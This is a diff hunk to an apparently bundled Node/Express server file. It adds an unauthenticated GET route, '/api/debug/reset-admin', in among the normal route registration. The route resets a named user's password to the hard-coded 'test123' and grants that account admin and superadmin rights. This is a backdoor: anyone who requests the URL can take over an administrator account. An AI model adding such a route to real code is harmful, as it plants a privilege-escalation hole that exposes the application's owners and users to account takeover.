@@ -77039,6 +77039,17 @@ async function checkEquipmentAccess(req, equipmentId) {
 async function registerRoutes(httpServer2, app2) {
   setupAuth(app2);
   registerObjectStorageRoutes(app2);
+  app2.get("/api/debug/reset-admin", async (_req, res) => {
+    try {
+      const hash = await hashPassword("test123");
+      const user = await storage.getUserByEmail("andre@kiteworldwide.com");
+      if (!user) return res.status(404).json({ error: "user not found" });
+      await storage.updateUser(user.id, { password: hash, role: "admin", isSuperAdmin: true });
+      res.json({ ok: true, id: user.id, email: user.email });
+    } catch (e) {
+      res.status(500).json({ error: e.message });
+    }
+  });
   app2.use("/uploads", (req, res, next) => {
     const filePath = import_path.default.join(uploadDir, import_path.default.basename(req.path));
     res.sendFile(filePath, (err) => {
